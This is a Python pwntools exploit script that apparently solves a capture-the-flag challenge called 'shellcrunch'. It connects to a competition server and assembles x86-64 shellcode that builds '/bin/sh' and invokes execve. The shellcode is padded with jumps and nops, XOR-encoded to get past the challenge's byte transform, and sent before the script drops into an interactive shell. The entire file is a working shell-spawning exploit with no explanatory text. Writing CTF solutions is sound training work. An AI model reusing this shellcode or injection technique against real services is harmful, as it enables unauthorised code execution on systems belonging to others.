from pwn import *

context.arch = "amd64"

# p = process("./shellcrunch")
# gdb.attach(p)

p = remote("chal.competitivecyber.club", 3004)

def xor_rev(p):
    res = bytearray(p)
    for i in range(0, len(p)-1, 4):
        res[i] = res[i] ^ res[i+1]
    return bytes(res)

binsh = [ord("/"), ord("b"), ord("i"), ord("n"), ord("/"), ord("s"), ord("h")]

shellcode = f"""
    jmp $+6
    nop
    nop
    xor ebx, ebx
    nop
    mov al, {binsh[6]}
    shl eax, 8
    jmp $+6
    nop
    nop
    xor ebx, ebx
    nop
    mov al, {binsh[5]}
    shl eax, 8
    jmp $+6
    nop
    nop
    xor ebx, ebx
    nop
    mov al, {binsh[4]}
    shl eax, 8
    jmp $+6
    nop
    nop
    xor ebx, ebx
    nop
    shl rax, 24
    nop
    jmp $+6
    nop
    nop
    xor ebx, ebx
    nop
    mov cl, {binsh[3]}
    shl ecx, 8
    jmp $+6
    nop
    nop
    xor ebx, ebx
    nop
    mov cl, {binsh[2]}
    shl ecx, 8
    jmp $+6
    nop
    nop
    xor ebx, ebx
    nop
    mov cl, {binsh[1]}
    shl ecx, 8
    jmp $+6
    nop
    nop
    xor ebx, ebx
    nop
    mov cl, {binsh[0]}
    or rax, rcx
    jmp $+6
    nop
    nop
    xor ebx, ebx
    push rax
    xor eax, eax
    mov rdi, rsp
    jmp $+6
    nop
    nop
    xor ebx, ebx
    nop
    mov al, 0x3b
    nop
    xor edx, edx
    jmp $+6
    nop
    nop
    xor ebx, ebx
    xor esi, esi
    syscall
    nop
    xor ebx, ebx
"""

payload = asm(shellcode)
payload = xor_rev(payload)

for c in payload: 
    print(f"{hex(c)}")

print(len(payload))

p.recvline()
p.sendline(payload)

p.interactive()